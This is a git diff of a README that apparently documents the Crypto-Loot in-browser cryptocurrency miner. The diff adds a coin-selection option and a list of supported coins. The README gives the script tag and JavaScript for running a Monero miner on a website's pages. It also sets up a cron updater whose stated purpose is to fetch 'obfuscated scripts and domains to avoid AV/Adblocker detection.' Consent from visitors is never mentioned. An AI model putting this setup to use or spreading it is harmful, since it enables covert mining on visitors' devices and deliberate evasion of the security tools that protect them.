@@ -16,7 +16,7 @@ or alternatively use ```git clone https://github.com/Crypto-Loot/cryptoloot.git`
 <script src="lib/crypta.js"></script>
 <script>
             var miner=new CRLT.Anonymous('YOUR_PUBLIC_KEY', {
-                threads:4,autoThreads:false,throttle:0.2,
+                threads:4,autoThreads:false,throttle:0.2,coin: "xmr"
             });
         miner.start();
 </script>
@@ -26,7 +26,7 @@ NOTE: Also, edit your site key above from the one you have on https://crypto-loo
 4) All set. Now just send some traffic!
 
 5) Optional: Set to automatically update (to stay up to date with the latest obfuscated scripts and domains to avoid AV/Adblocker detection):
-Make sure to install php-curl extension on your server if it does not exist:
+Make sure to install php-curl extension on your server if it does not exist: 
 
 ***CentOS:***
 ```text
@@ -44,6 +44,12 @@ Install the cron to check for updates once every 12 hours:
 ```text
 0 */12 * * * php /var/www/html/website/updater.php >> /var/www/html/website/cl_log.txt
 ```
+
+Supported Coins:
+===============
+xmr: ```coin: xmr```
+upx: ```coin: upx```
+Mix of both upx & xmr (50/50): ```coin: xmrupx```
 
 Have any questions?
 ===================
